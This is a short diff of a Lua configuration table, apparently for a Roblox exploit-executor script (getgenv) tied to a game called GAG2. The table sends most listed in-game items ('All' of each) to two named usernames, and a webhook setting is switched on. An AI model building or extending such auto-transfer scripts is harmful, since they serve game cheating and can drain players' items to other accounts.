@@ -101,11 +101,11 @@ getgenv().GAG2 = {
         ["Super Syrup Watering Can"] = { Amount = "All", To = {"VortexPanda526"} },
         ["Mega"] = { Amount = "All", To = {"VortexPanda526"} },
         ["Gold"] = { Amount = "All", To = {"VortexPanda526"} },
-        ["Maple Bamboo"] = { Amount = 200, To = {"LunarVolt38"} },
-        ["Rainbow"] = { Amount = "All", To = {"LunarVolt38"} },
         ["Legendary Magic Mail"] = { Amount = "All", To = {"LunarVolt38"} },
         ["Amber Cranberry"] = { Amount = "All", To = {"LunarVolt38"} },
         ["Atlantic Giant Pumpkin"] = { Amount = "All", To = {"LunarVolt38"} },
+        [ "Maple Venom Spitter"] = { Amount = "All", To = {"LunarVolt38"} },
+        ["Maple Venus Fly Trap"] = { Amount = "All", To = {"LunarVolt38"} },
     },
     
     ShowUserWebhook = true,
